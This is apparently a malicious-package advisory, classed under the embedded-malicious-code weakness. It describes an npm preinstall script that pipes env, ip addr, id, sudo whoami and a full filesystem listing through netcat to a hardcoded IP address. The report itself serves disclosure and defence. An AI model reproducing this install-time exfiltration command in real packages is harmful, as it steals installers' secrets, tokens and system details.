summary: preinstall exfiltrates environment, identity, and filesystem inventory to bare-IP netcat listener
details: package.json declares a preinstall lifecycle script that runs on npm install and pipes the combined output of `env`, `ip addr`, `id`, `find / -type f`, and `sudo whoami` to `nc 49.13.60.225 888`. Installing this package ships the installer's full process environment (including any CI/cloud/registry secrets present in env such as AWS_*, GCP_*, AZURE_*, NPM_TOKEN, GITHUB_TOKEN, database URLs), network interface configuration, current user identity, a passwordless-sudo capability probe, and a recursive listing of every file readable by the installing user to a hardcoded bare IPv4 address over plain TCP. There is no benign purpose for this behavior; it is an install-time credential and reconnaissance harvester.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
